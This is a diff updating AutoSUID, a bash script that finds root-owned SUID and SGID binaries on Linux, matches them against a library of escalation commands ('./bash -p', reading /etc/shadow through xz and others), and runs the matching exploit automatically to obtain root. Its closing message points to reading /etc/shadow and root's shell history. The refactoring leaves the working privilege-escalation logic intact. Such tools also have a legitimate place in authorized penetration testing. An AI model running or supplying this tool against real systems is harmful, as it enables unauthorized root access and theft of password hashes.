@@ -21,7 +21,7 @@
 ############################################################################
 
 # Variables
-version="1.11"
+version="1.12"
 releasedate="November 30, 2021"
 updatedate="December 8, 2021"
 suidlist=(ar arj arp as ash atobm awk base32 base64 basenc bash bridge busybox bzip2 capsh cat chmod chown chroot cmp column comm cp cpio cpulimit csh csplit csvtool cupsfilter curl cut dash date dd dialog diff dig dmsetup docker dosbox ed emacs env eqn expand expect file find flock fmt fold gawk gcore gdb gimp grep gtester gzip hd head hexdump highlight hping3 iconv install ionice ip jjs join jq jrunscript ksh ksshell ld.so less logsave look lua make mawk more msgattrib msgcat msgconv msgfilter msgmerge msguniq mv nasm nawk nice nl nmap node nohup od openssl openvpn paste perf perl pg php pr python readelf restic rev rlwrap rsync run-parts rview rvim sed setarch shuf soelim sort sqlite3 ss ssh-keygen ssh-keyscan start-stop-daemon stdbuf strace strings sysctl systemctl tac tail taskset tbl tclsh tee tftp tic time timeout troff ul unexpand uniq unshare update-alternatives uudecode uuencode view vigr vim vimdiff vipw watch wc wget whiptail xargs xmodmap xmore xxd xz zsh zsoelim);
@@ -29,7 +29,7 @@ restrictedfile="/etc/shadow"
 suidlistcount=${#suidlist[@]}; # Count the output
 rootsuidlist=(bash zsh ash capsh chroot cpulimit csh dash env expect find flock ionice ksh ld.so logsave nice node nohup php python setarch start-stop-daemon stdbuf strace taskset xargs tclsh time timeout unshare run-parts rview rvim view vim vimdiff);
 
-### SUID library
+# SUID library
 declare -A suidlibrary=(
 	[bash]="Privilege escalation: ./bash -p"
 	[bash_cmd]="-p"
@@ -244,8 +244,8 @@ declare -A suidlibrary=(
 	[xz]="Read the restricted file: ./xz -c FILE_NAME | xz -d"
 	[zsoelim]="Read the restricted file: ./zsoelim FILE_NAME"
 )
-### SUID library
 
+# Pretty colours
 red=$(tput setaf 1)
 green=$(tput setaf 2)
 cyan=$(tput setaf 6)
@@ -281,64 +281,58 @@ msg_box() {
         printf "%${rpad}.${rpad}s║\n"
     done
 
-    printf '║%79s ║\n' " " && printf  '╚' && printf '%.0s═' {0..79}  && printf '╝\n%s' "${rst}"
+    printf '║%79s ║\n' " " && printf  '╚' && printf '%.0s═' {0..79}  && printf '╝\n%s' "${reset}"
 }
 
 
 msg_box "AutoSUID ${version}" "Release Date: ${releasedate}" "Update Date: ${updatedate}"
 
 ## Header
-#echo -e "";
-#echo -e "${orange}╔═══════════════════════════════════════════════════════════════════════════╗${reset}";
-#echo -e "${orange}║\t\t\t\t\t\t\t\t\t    ║${reset}";
-#echo -e "${orange}║${reset}${green}\t\t\t\t  AutoSUID\t\t\t\t    ${reset}${orange}║${reset}";
-#echo -e "${orange}║\t\t\t\t\t\t\t\t\t    ║\e[00m";
-#echo -e "${orange}╚═══════════════════════════════════════════════════════════════════════════╝${reset}";
-echo -e "";
-echo -e "${orange}[ ! ] https://www.linkedin.com/in/IvanGlinkin/ | @glinkinivan${reset}";
-echo -e "";
+printf  "";
+printf  "%s[ ! ] https://www.linkedin.com/in/IvanGlinkin/ | @glinkinivan\n%s" "${orange}" "${reset}"
+printf  "%s[ ! ] https://www.linkedin.com/in/CareyMcLelland | @careymclelland\n%s" "${orange}" "${reset}"
+printf  "";
 
 ## Find the SUID files
-echo -e "${orange}[ ! ]${reset} Running the command to find SUID files";
-echo -e "${blue}[ * * ]${reset}${green} find / -xdev -user root \( -perm -4000 -o -perm -2000 -o -perm -6000 \) 2>/dev/null${reset}";
+printf  "%s[ ! ]%s Running the command to find SUID files\n" "${orange}" "${reset}"
+printf  "%s[ * * ]%s%s find / -xdev -user root \( -perm -4000 -o -perm -2000 -o -perm -6000 \) 2>/dev/null%s\n" "${blue}" "${reset}" "${green}" "${reset}"
 suidArray=$(find / -xdev -user root \( -perm -4000 -o -perm -2000 -o -perm -6000 \) 2>/dev/null); # Harvesting SUID files
 
 ## Check if there are no related files
 if [ -z "$suidArray" ]; then
-	echo -e "${red}[ - ]${reset} The command has successfuly performed, but we did not find any related files";
+	printf  "%s[ - ]%s The command has successfuly completed, but we did not find any related files\n" "${red}" "${reset}"
 	exit
 fi
 
-countsuidArray=$(echo $suidArray | tr " " "\n" | wc -l); # Count the output
-echo -e "${green}[ + ]${reset} The command has successfuly performed. We have found ${green}$countsuidArray${reset} file(s)";
+countsuidArray=$(echo "${suidArray}" | tr " " "\n" | wc -l); # Count the output
 
-echo -e "${orange}[ ! ]${reset} Let's compare the found SUID files with predefined base (${green}$suidlistcount${reset} apps)";
+printf  "%s[ + ]%s The command has successfuly completed. We have found %s%s%s file(s)\n" "${green}" "${reset}" "${green}" "${countsuidArray}" "${reset}"
+printf  "%s[ ! ]%s Let's compare the found SUID files with predefined base (%s%s%s apps)\n" "${orange}" "${reset}" "${green}" "${suidlistcount}" "${reset}"
 
 ## Check if the found SUID files leads to escalation
 for suidSelect in "${suidlist[@]}"; do
-    exploitablesuidarray+=($(echo $suidArray | tr " " "\n" | grep -i "/$suidSelect$" | awk '{print $1 " "}'));
+    exploitablesuidarray+=($(echo "${suidArray}" | tr " " "\n" | grep -i "/$suidSelect$" | awk '{print $1 " "}'));
 done;
 
 #### No results
-if [ -z "$exploitablesuidarray" ]; then
-	echo -e "${red}[ - ]${reset} Unfortunately, there are no any SUID files, which lead to privilege escalation";
+if [ -z "${exploitablesuidarray}" ]; then
+	printf  "%s[ - ]%s There are no SUID files which lead to privilege escalation\n" "${red}" "${reset}"
 	## Clean residual pwn* files
 	rm pwn*
 	exit
 fi
 
 exploitablesuidarraycount=${#exploitablesuidarray[@]}; # Count the output
-echo -e "${green}[ + ]${reset} We have found at least ${green}$exploitablesuidarraycount${reset} potential SUID exploitable file(s):"
-for suidexploitable in "${exploitablesuidarray[@]}"
-do
-	suidcommand=$(echo $suidexploitable | awk -F "/" '{print $NF}'); # clear the path
-	suidexplanation=$(echo ${suidlibrary[$suidcommand]});
-	echo -e "\n${blue}[ * * ]${reset} $suidexploitable";
-	echo -e "${blue}[ Explanation ]${reset} ${green}$suidexplanation${reset}";
+printf  "%s[ + ]%s We have found at least %s%s%s potential SUID exploitable file(s):\n" "${green}" "${reset}" "${green}" "${exploitablesuidarraycount}" "${reset}"
+for suidexploitable in "${exploitablesuidarray[@]}"; do
+	suidcommand=$(echo "${suidexploitable}" | awk -F "/" '{print $NF}'); # clear the path
+	suidexplanation=$(echo "${suidlibrary[$suidcommand]}");
+	printf  "\n%s[ * * ]%s %s\n" ${blue} ${reset} ${suidexploitable} "${blue}"
+	printf  "%s[ Explanation ]%s %s%s%s\n" "${blue}" "${reset}" "${green}" "${suidexplanation}" "${reset}"
 done
 
 ## The further attack explanation
-echo -e "\n${green}[ + ]${reset} Exploitation..."
+printf  "\n%s[ + ]%s Exploitation..." "${green}" "${reset}"
 for suidexploitable in "${exploitablesuidarray[@]}"
 do
 	suidcommand=$(echo $suidexploitable | awk -F "/" '{print $NF}'); # clear the path
@@ -347,10 +341,10 @@ do
 		if [ $suidcommand == $suidSelect ]
 			then
 			wehavesuidtoroot=true;
-			echo -e "${blue}[ * * ]${reset} We have found${red} $suidSelect SUID${reset} file. Trying to get root";
+			printf  "%s[ * * ]%s We have found %s%s SUID%s file. Trying to get root" "${blue}" "${reset}" "${red}" "${suidSelect}" "${reset}"
 			keys=$(echo $suidSelect"_cmd");
 			exploit=$(echo $suidexploitable ${suidlibrary[$keys]});
-			echo -e "${blue}[ * * ]${reset} Executing ${red}$exploit${reset}";
+			printf  "%s[ * * ]%s Executing %s%s%s" "${blue}" "${reset}" "${red}" "${exploit}" "${reset}"
 			$exploit;
 		fi;
 	done
@@ -361,5 +355,5 @@ done
 rm pwn*
 
 if [ ! $wehavesuidtoroot ]; then
-    echo -e "${blue}[ * * ]${reset} Seems like there are no privilege escalation files through SUID in the system. Follow the instructions above to read the restricted files, eg. ${red}/etc/shadow${reset} or ${red}/root/.bash_history${reset}, or perform other high privileges commands. P.s. think outside the box to pivot into the root ;)";
+    printf  "%s[ * * ]%s Seems like there are no privilege escalation files through SUID in the system. Follow the instructions above to read the restricted files, eg. %s/etc/shadow%s or %s/root/.bash_history%s, or perform other high privileges commands. P.s. think outside the box to pivot into the root ;)" "${blue}" "${reset}" "${red}" "${reset}" "${red}" "${reset}"
 fi
